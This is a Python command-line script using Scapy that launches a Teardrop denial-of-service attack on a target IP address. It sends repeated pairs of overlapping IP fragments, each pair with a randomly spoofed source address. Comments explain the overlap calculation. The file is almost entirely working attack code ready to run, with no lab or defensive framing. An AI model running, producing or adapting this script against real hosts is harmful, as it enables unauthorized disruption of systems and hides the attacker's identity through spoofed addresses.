#!/usr/bin/env python3

import argparse
import random
import sys
import time
from scapy.all import IP, ICMP, send, Raw

def random_ip():
    """Generates a random IPv4 address."""
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def teardrop_attack(target_ip, count):
    """
    Performs a Teardrop attack by sending fragmented IP packets
    with overlapping offsets.

    Args:
        target_ip (str): The IP address of the target.
        count (int): The number of Teardrop packet pairs to send.
    """
    print(f"[*] Starting Teardrop attack on {target_ip} with {count} packet pairs.")

    # Teardrop attack parameters:
    # Fragment 1: Large payload, MF (More Fragments) flag set, offset 0.
    # Fragment 2: Smaller payload, offset that overlaps with Fragment 1,
    #             and (offset + len(payload2)) < len(payload1).

    # Payload for the first fragment (e.g., 20 bytes of data for ICMP payload)
    # Actual IP payload will be ICMP header (8 bytes) + this data.
    payload1_data = b'A' * 20 # Results in IP payload length of 8 + 20 = 28 bytes
    
    # For the second fragment:
    # Offset (in bytes) into the first fragment's payload.
    # Must be less than len(payload1_data) + 8.
    # Scapy's frag field is in units of 8 bytes.
    frag2_offset_scapy = 2  # This means an actual offset of 2 * 8 = 16 bytes.

    # Payload for the second fragment (e.g., 2 bytes of data for ICMP payload)
    # (offset_bytes + len(payload2_data) + 8) < (len(payload1_data) + 8)
    # 16 + (len(payload2_data) + 8) < 28
    # 16 + 8 + len(payload2_data) < 28
    # 24 + len(payload2_data) < 28
    # len(payload2_data) < 4. Let's use 2 bytes.
    payload2_data = b'B' * 2 # Results in IP payload length of 8 + 2 = 10 bytes

    # Verify Teardrop condition:
    # len1_ip_payload = len(ICMP()/payload1_data) # 28
    # len2_ip_payload = len(ICMP()/payload2_data) # 10
    # offset2_bytes = frag2_offset_scapy * 8 # 16
    # Condition: offset2_bytes + len2_ip_payload < len1_ip_payload
    #            16         +       10        <    28
    #                       26                <    28  (This holds true)

    for i in range(count):
        source_ip = random_ip()
        ip_identification = random.randint(1000, 65000)

        # Craft Fragment 1
        icmp_payload1 = ICMP() / Raw(load=payload1_data)
        frag1 = IP(src=source_ip, dst=target_ip, id=ip_identification, flags="MF", frag=0, proto=1) / icmp_payload1

        # Craft Fragment 2
        icmp_payload2 = ICMP() / Raw(load=payload2_data)
        frag2 = IP(src=source_ip, dst=target_ip, id=ip_identification, frag=frag2_offset_scapy, proto=1) / icmp_payload2

        send(frag1, verbose=False)
        send(frag2, verbose=False)

        if (i + 1) % 10 == 0:
            print(f"[+] Sent {i + 1}/{count} Teardrop packet pairs...")
        time.sleep(0.01) # Small delay between pairs

    print(f"\n[+] Teardrop attack complete. Sent {count} packet pairs to {target_ip}.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform a Teardrop attack.")
    parser.add_argument("target_ip", help="The IP address of the target.")
    parser.add_argument("count", type=int, help="The number of Teardrop packet pairs to send.")

    args = parser.parse_args()

    if args.count <= 0:
        print("[!] Error: Number of packet pairs must be positive.")
        sys.exit(1)

    try:
        teardrop_attack(args.target_ip, args.count)
    except PermissionError:
        print("[!] Error: This script requires root/sudo privileges to send raw packets.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")
